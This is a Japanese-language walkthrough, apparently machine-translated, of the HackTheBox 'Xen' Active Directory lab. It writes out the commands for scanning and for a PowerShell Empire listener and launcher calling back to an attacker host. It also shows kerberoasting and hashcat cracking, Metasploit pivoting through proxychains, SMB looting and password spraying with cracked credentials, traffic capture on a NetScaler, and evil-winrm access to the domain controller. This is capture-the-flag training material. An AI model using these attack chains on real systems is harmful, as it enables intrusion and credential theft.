HackTheBoxエンドゲーム。ウォークスルーXenラボ。Pentest Active Directory



この記事では、車だけでなく、HackTheBoxサイトのミニラボ全体の通路を分析します。

説明で述べたように、Xenは小規模なActive Directory環境で攻撃のすべての段階でスキルをテストするように設計されています。目標は、6つのフラグを収集しながら、アクセス可能なホストを危険にさらし、特権を増やし、最終的にドメイン全体を危険にさらすことです。

別のプロフェッショナル進攻作戦ラボの説明を参照してくださいここに。

実験室への接続はVPN経由です。情報セキュリティの分野で何かを知っている人とプライベートネットワークに行き着くため、仕事用のコンピューターや、重要なデータが利用できるホストからは接続しないことをお勧めします。

違反フラグ


このマシンのIPアドレスは10.13.38.12で、/ etc / hostsに追加します。
10.13.38.12 xen.htb

まず、開いているポートをスキャンします。nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。tun0インターフェースからすべてのTCPおよびUDPポートを毎秒500パケットの速度でスキャンします。

sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500



ここで、ポートで動作するサービスの詳細については、-Aオプションを指定してスキャンを実行します。

nmap -A xen.htb -p25,80,443



したがって、IISとSMTPがあります。同時に、ポート80と443でHTTP接続とHTTPS接続の両方の可能性があります。ウェブを見てみましょう-シンプルなサイトで迎えられます。



「チームに参加する」というリンクを除いて、興味深いものは何もありません。これは、jointheteam @ humongousretail.comのメールアドレスを示しています。



ディレクトリを見ていきましょう。私はこれにgobusterを使用します。パラメータには、128（-t）、URL（-u）、ディクショナリ（-w）、および関心のある拡張機能（-x）のストリーム数を示します。

gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx



そして、いくつかの興味深いディレクトリを見つけます。 401コードは、HTTP認証の存在を示しています。リモートを見てみましょう。



承諾し、資格情報が必要です。

smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb

ゴーストフラグ


さらに詳しく調べるには、PowerShellを使用すると便利であり、PowerShellエンパイア（ここで私が書いたもの）を操作するのがさらに便利です。セッションを開いてみましょう。このために、最初にそのためのhttpおよびPSランチャーを作成します。

> listeners
> uselistener http
> set Host 10.14.14.9
> set Port 5656
> execute
> back
> launcher powershell http



ランチャーをs.ps1ファイルに保存します。meterpreterを介してメモリから実行するには、powershellモジュールをロードする必要があります。



そしてpowershell_importを実行します。



Empireウィンドウで、作成されたエージェントを見つけます。



作業を簡単にするために、ワークステーションの名前で名前を変更し、インタラクティブモードに切り替えます。





インテリジェンスのために、ドメインコントローラを定義する必要があります。これは、状況シチュエーションのセクションの1つの素晴らしいモジュールget_domain_controllerを使用して行います。

> usemodule situational_awareness/network/powerview/get_domain_controller
> run



したがって、ドメインコントローラに関する情報を取得します。次に、ドメインユーザーを一覧表示します。この時点で、特権ユーザーをすぐに識別するために、アカウント名とAdminCountプロパティの値を取得する必要があります。

> usemodule situational_awareness/network/powerview/get_user
> set Server DC.htb.local
> set Properties samaccountname,admincount
> run



すぐにSPNをチェックして、ケルベロスティングが可能かどうかを判断しましょう。

> usemodule situational_awareness/network/powerview/get_user
> set Server DC.htb.local
> set Properties serviceprincipalname
> run



そしてSPNがあります！同じ帝国を使ってケルベロスティングをしましょう。出力形式を指定します-hashcat。

> usemodule credentials/invoke_kerberoast
> set OutputFormat Hashcat
> run



そして、ユーザーハッシュを取得します。ハッシュキャットを繰り返します。

hashcat -m 13100 -a 0 krb.hash rockyou.txt --force

このパスワードはrockyou辞書で見つからなかったので、Seclistsのすべての辞書を確認しました。しかし、このオプションも失敗しました。最後のオプションは、NSAルールを使用することです。



リポジトリに示されているように、ダイビングは最良のオプションなので、2番目のバージョンを使用します。

hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2



そして、このユーザーのパスワードを取得します。さらなる進歩のために、ローカルネットワークをスキャンしましょう。ICMPがブロックされる可能性があるため、これはARPスキャンを使用して行うのが最適です。これにはarpscanモジュールが役立ちます。ネットワークのアドレスとマスクがわかっているため、ホストの範囲を設定します。

> usemodule situational_awareness/network/arpscan
> set Range 172.16.249.0-172.16.249.255
> run



したがって、このリストからは、201と202の2つのホストはわかりません。ドメイン内の共有リソースを確認してみましょう。パラメーターからは、ドメインコントローラーのアドレスのみが必要です。

> usemodule situational_awareness/network/powerview/share_finder
> set Server DC.htb.local
> run



スキャンするたびに、ネットワークに対する理解が深まり、CITRIX.htb.localがどのようなホストであるかを調べてみましょう。



以下は私たちが蓄積する情報です。



内部ネットワーク上のリソースと対話するには、トンネルを構成する必要があります。これは、autorouteコマンドを使用してアクティブなMeterpreterセッションで行い、内部ネットワークアドレスとマスクをパラメーターとして指定します（-pパラメーターを使用すると、アクティブなルートを確認できます）。

run autoroute -s 172.16.249.0/24



ターゲットネットワークへのルートを追加したので、プラットフォーム内からsocks4aツールを使用します。補助モジュールauxiliary / server / socks4aは、接続を中継するために作成したMetasploitルーティングインフラストラクチャを使用するプロキシサーバーを提供します。



また、クライアントリダイレクターとしてプロキシチェーンを使用します。/etc/proxychains.conf設定をmetasploitで設定されたポートに変更します（デフォルトのポートは1080）



見つかったユーザーの場合、Citrix $ディレクトリは読み取り可能です。proxychainsは接続情報を表示するため、リダイレクト2> / dev / nullを使用して削除します。

proxychains cme smb -u mturner -p '4install!' -d htb.local 172.16.249.201 --share "Citrix$" --shares 2>/dev/null



このリソースで利用できるすべてのものを見てみましょう。

proxychains smbmap -u mturner -p '4install!' -d htb.local -H 172.16.249.201 -R 2>/dev/null



そして、フラグとppkファイルを見つけます。すべてのファイルを取得しましょう。

sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!



接続時に、クライアントの最小プロトコルオプションを指定することで解消できるエラーが発生します。

sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option='client min protocol=NT1' 2>/dev/null



そして旗を手渡します。





迷彩旗


Putty秘密鍵を理解しましょう。



この秘密鍵は暗号化され、SSH認証用に設計されています。鍵を復号化するために使用されるパスワードを見てみましょう。これを行うには、最初にキーをjohn形式に再フォーマットします。



しかし、標準の辞書によるソートは機能せず、「便利なタイプの」パスワードを生成するための優れたツールであるkwprocessorを私に促しました。辞書を作ってみましょう。

./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route



そして、16文字のパスワードが正常に見つかりました。

john --wordlist=./kwprocessor/key-dict.txt putty.john



Linuxを使用しているので、通常のSSHクライアントで作業する方が便利です。キーをこの形式に再フォーマットします。

sudo apt install putty-tools
puttygen private.ppk -O private-openssh -o id_rsa

今、私たちは彼と一緒にどこに行くことができるかを決めます。これを行うには、内部ネットワークをスキャンして、開いているポート22を見つけます。

proxychains nmap -p22 172.16.249.200-205 2>/dev/null



そして、私たちは見つけましたが、このホストについてはまだ何も知りません。名前なしで接続しようとすると、興味深いメッセージとパスワード要求が表示されます。



私たちが知っているユーザーの名前を調べても、結果は得られませんでした。スクリプトを使用してこのサービスのnmapをスキャンしても何も得られませんでした。



次に、ホストのすべてのポートをスキャンしました。しかし、proxychains情報でポートが使用可能かどうかを確認できるため、非常に長い時間がかかったため、スキャンの終了を待たなかった。



ポート80が利用可能だったので、ブラウザにプロキシをインストールし、そこに何があるかを確認しました。



Citrix NetScalerの承認ページが表示されます。そして、Googleは、デフォルトのログインを認識するドキュメントに私たちを導きます。





このログインにより、SSH経由で正常に接続します。



サーバーを歩き回った後、この種の機器への攻撃に関する資料を調べました。その1つがトラフィックの監視です。したがって、しばらくtcpdumpをアクティブのままにして、トラフィックダンプを受け取りました。

tcpdump -s0 -w r.pcap



このファイルをダウンロードしてください。

proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./

また、資格情報をすばやく見つけるために、PCredzを使用しています。



そして、別のフラグを取得します。



ドッペルゲンガーの旗


ただし、このプログラムはまったく調べないため、さまざまなシークレットまたはトークンの存在についてダンプを分析する必要があります。パケットをプロトコルでソートした後、LDAPにアクセスして、パスワードを持つ2人のユーザーのbindRequestを見つけます（すでに1人見つけています）。





このユーザーのこのパスワードを確認してください。

proxychains cme smb -u "netscaler-svc" -p "#S3rvice#@cc" -d htb.local 172.16.249.200 2>/dev/null



このユーザーは、サービスのユーザーであることを除いて、注目に値しません。そのようなユーザーのパスワードは、他のドメインユーザーのパスワードと一致することがよくあります。他のどのユーザーがこのパスワードを使用するか確認してみましょう。metasploitを使用してこれを行いました。

proxychains msfconsole 2>/dev/null
> use auxiliary/scanner/smb/smb_login
> set SMBDomain htb.local
> set RHOSTS 172.16.249.200
> set USER_FILE ~/tmp/users.txt
> set PASS_FILE ~/tmp/passwords.txt
> set VERBOSE false
> run



そして、このパスワードはすべてのサービスアカウントに送信されました。前述のとおり、backup-svcアカウントには特権が与えられています。つまり、ドメインコントローラーへのログオンが許可されています。RDP（3389）およびWinRM（5985）サービスの開いているポートを確認します。

proxychains nmap -p 3389,5985 172.16.249.200 2>/dev/null



どちらのログイン方法も可能ですが、私はWinRMを好みます。Evil-WinRMプログラムを使用してログインします。

proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p "#S3rvice#@cc" 2>/dev/null



そして別の旗を取ります。
